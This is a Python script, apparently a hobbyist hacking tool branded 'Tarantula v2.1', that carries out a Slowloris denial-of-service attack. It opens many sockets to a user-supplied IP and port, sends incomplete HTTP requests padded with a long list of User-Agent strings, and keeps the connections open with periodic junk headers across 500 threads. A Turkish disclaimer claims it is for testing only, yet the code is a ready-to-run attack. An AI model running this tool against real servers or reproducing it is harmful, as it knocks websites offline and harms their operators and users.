#!/usr/bin/env python
import socket, random , sys , time , os , threading 
from colorama import init
from termcolor import colored
from progress.spinner import Spinner , PieSpinner
from progress.bar import IncrementalBar

def banner():
    init()
    i=0
    load = Spinner()
    while(i<5):
        i=i+1
        time.sleep(1)
        load.next()
    load.finish()
    os.system("clear")

    print(colored("""
----------------------------------------------------------

████████╗░█████╗░██████╗░░█████╗░███╗░░██╗████████╗██╗░░░██╗██╗░░░░░░█████╗░  
╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗████╗░██║╚══██╔══╝██║░░░██║██║░░░░░██╔══██╗  
░░░██║░░░███████║██████╔╝███████║██╔██╗██║░░░██║░░░██║░░░██║██║░░░░░███████║  
░░░██║░░░██╔══██║██╔══██╗██╔══██║██║╚████║░░░██║░░░██║░░░██║██║░░░░░██╔══██║  
░░░██║░░░██║░░██║██║░░██║██║░░██║██║░╚███║░░░██║░░░╚██████╔╝███████╗██║░░██║  
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░░╚═════╝░╚══════╝╚═╝░░╚═╝  

██╗░░░██╗  ██████╗░░░░░░███╗░░
██║░░░██║  ╚════██╗░░░░████║░░
╚██╗░██╔╝  ░░███╔═╝░░░██╔██║░░
░╚████╔╝░  ██╔══╝░░░░░╚═╝██║░░
░░╚██╔╝░░  ███████╗██╗███████╗
░░░╚═╝░░░  ╚══════╝╚═╝╚══════╝
----------------------------------------------------------
Version:2.1
Dipnot=Test amaçlı yazılmış olup tüm sorumluluk kullanıcıya aittir.
----------------------------------------------------------   ""","cyan"))
    print(colored("""
#########################
#  Created by Rei-ken   #
#########################""","blue"))
    print(colored("""       
Github : https://github.com/Rei-ken/
Youtube: https://youtube.com/channel/UC0huPBEXz8EW8SekJWVE_JQ
Discord: https://discord.gg/fMWyY5b 
Web    : https://reiken.online/
""","magenta"))


def slowloris():
    user_agents = [
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.11pre) Gecko/20071206 Firefox/2.0.0.11 Navigator/9.0.0.5",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.11pre) Gecko/20071206 Firefox/2.0.0.11 Navigator/9.0.0.5 GTB5",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.11pre) Gecko/20071206 Firefox/2.0.0.11 Navigator/9.0.0.5",
        "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1.11pre) Gecko/20071206 Firefox/2.0.0.11 Navigator/9.0.0.5",
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1.11pre) Gecko/20071206 Firefox/2.0.0.11 Navigator/9.0.0.5",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.11pre) Gecko/20071206 Firefox/2.0.0.11 Navigator/9.0.0.5",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Opera/9.25 (Windows NT 6.0; U; en)",
        "Opera/9.30 (Nintendo Wii; U; ; 2047-7; en)",
        "Opera/9.51 Beta (Microsoft Windows; PPC; Opera Mobi/1718; U; en)",
        "Opera/9.5 (Microsoft Windows; PPC; Opera Mobi; U) SonyEricssonX1i/R2AA Profile/MIDP-2.0 Configuration/CLDC-1.1",
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.1.11320/608; U; en) Presto/2.2.0",
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14320/554; U; cs) Presto/2.2.0",
        "Opera/9.64 (Macintosh; PPC Mac OS X; U; en) Presto/2.1.1",
        "Opera/9.64 (X11; Linux i686; U; Linux Mint; nb) Presto/2.1.1",
        "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.16823/1428; U; en) Presto/2.2.0",
        "Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00",
        "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
        "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61",
        "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
        "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00",
        "Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10",
        "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
        "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
        "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
        "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
        "Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00",
        "P3P Validator",
        "Peach/1.01 (Ubuntu 8.04 LTS; U; en)",
        "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
        "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
        "portalmmm/2.0 N410i(c20;TB) ",
        "Python-urllib/2.5",
        "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
        "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
        "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
        "SearchExpress",
        "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
        "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
        "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
        "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
        "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
        "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
        "SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
        "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
        "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
        "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
        "SonyEricssonT100/R101",
        "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
        "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
        "SonyEricssonT68/R201A",
        "SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
        "SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
        "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
        "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
        "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]",
        "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
        "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
        "SuperBot/4.4.0.60 (Windows XP)",
        "Uzbl (Webkit 1.3) (Linux i686 [i686])",
        "Vodafone/1.0/V802SE/SEJ001 Browser/SEMC-Browser/4.1",
        "W3C_Validator/1.305.2.12 libwww-perl/5.64",
        "W3C_Validator/1.654",
        "w3m/0.5.1",
        "WDG_Validator/1.6.2",
        "WebCopier v4.6",
        "Web Downloader/6.9",
        "WebZIP/3.5 (http://www.spidersoft.com)",
        "Wget/1.9.1",
        "Wget/1.9 cvs-stable (Red Hat modified)",
        "wii libnup/1.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1",
        "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.8pre) Gecko/20071001 Firefox/2.0.0.7 Navigator/9.0RC1",
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.12) Gecko/20080219 Firefox/2.0.0.12 Navigator/9.0.0.6",
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.12) Gecko/20080219 Firefox/2.0.0.12 Navigator/9.0.0.6",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.12) Gecko/20080219 Firefox/2.0.0.12 Navigator/9.0.0.6",
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1.12) Gecko/20080219 Firefox/2.0.0.12 Navigator/9.0.0.6",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
        "Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3",
        "Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5",
        "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8",
        "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3",
        "Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",
        "MSIE (MSIE 6.0; X11; Linux; i686) Opera 7.23",
        "msnbot/0.11 ( http://search.msn.com/msnbot.htm)",
        "msnbot/1.0 ( http://search.msn.com/msnbot.htm)",
        "msnbot/1.1 ( http://search.msn.com/msnbot.htm)",
        "msnbot-media/1.1 ( http://search.msn.com/msnbot.htm)",
        "NetSurf/1.2 (NetBSD; amd64)",
        "Nokia3230/2.0 (5.0614.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0",
        "Nokia6100/1.0 (04.01) Profile/MIDP-1.0 Configuration/CLDC-1.0",
        "Nokia6230/2.0 (04.44) Profile/MIDP-2.0 Configuration/CLDC-1.1",
        "Nokia6230i/2.0 (03.80) Profile/MIDP-2.0 Configuration/CLDC-1.1",
        "Nokia6630/1.0 (2.3.129) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1",
        "Nokia6630/1.0 (2.39.15) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1",
        "Nokia7250/1.0 (3.14) Profile/MIDP-1.0 Configuration/CLDC-1.0",
        "NokiaN70-1/5.0609.2.0.1 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
        "NokiaN73-1/3.0649.0.0.1 Series60/3.0 Profile/MIDP2.0 Configuration/CLDC-1.1",
        "nook browser/1.0",
        "Offline Explorer/2.5",
        "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
        "Opera/7.50 (Windows ME; U) [en]",
        "Opera/7.50 (Windows XP; U)",
        "Opera/7.51 (Windows NT 5.1; U) [en]",
        "Opera/8.01 (J2ME/MIDP; Opera Mini/1.0.1479/HiFi; SonyEricsson P900; no; U; ssr)",
        "Opera/9.0 (Macintosh; PPC Mac OS X; U; en)",
        "Opera/9.20 (Macintosh; Intel Mac OS X; U; en)",
        ]
    sockets=[]
    def socket_info(ip,port):
        soket= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soket.connect((ip,int(port)))
        soket.settimeout(4)
        soket.send("GET /{} HTTP/1.1\r\n".format(random.randint(0,3000)).encode('UTF-8'))
        for head in user_agents:
            soket.send('{}\r\n'.format(head).encode('UTF-8'))
        return soket

    def main():
        if len(sys.argv)<5:
            print(colored("Kullanım-usage:{}  <socket count> <timer> <ip> <port> ","cyan").format(sys.argv[0]))
            return
        elif len(sys.argv)>5:
            print(colored("Yanlış parametre girdiniz","red"))
            sys.exit()
        socket_count= int(sys.argv[1])
        timer = int(sys.argv[2])
        ip = sys.argv[3]
        port=sys.argv[4]
        pie = PieSpinner()
        for _ in range(int(socket_count)):
            try:
                soket=socket_info(ip,port)
            except socket.error:
                break
            sockets.append(soket)
            pie.next()
        os.system("clear")
        def attack_start():
            while True:
                print(colored("atak sürüyor....","yellow"))
                print(colored("*","red"))
                print(colored("soket sayısı: {}".format(len(sockets)),"magenta"))
                print("")
                for soket in sockets:
                    try:
                        soket.send("X-a {}\r\n".format(random.randint(1,2000)).encode('UTF-8'))
                    except socket.error:
                        sockets.remove(soket)
                for _ in range(socket_count - len(sockets)):
                        print(colored("...".format("\n"),"cyan"))
                        try:
                            soket=socket_info(ip,port)
                            if soket:
                                sockets.append(soket)
                        except socket.error:
                            break
                time.sleep(timer)
        for i in range(500):
            thread = threading.Thread(target=attack_start) 
            thread.start()
        if __name__=="__main__":
            attack_start()
    if __name__=="__main__":
        main()
banner()
slowloris()



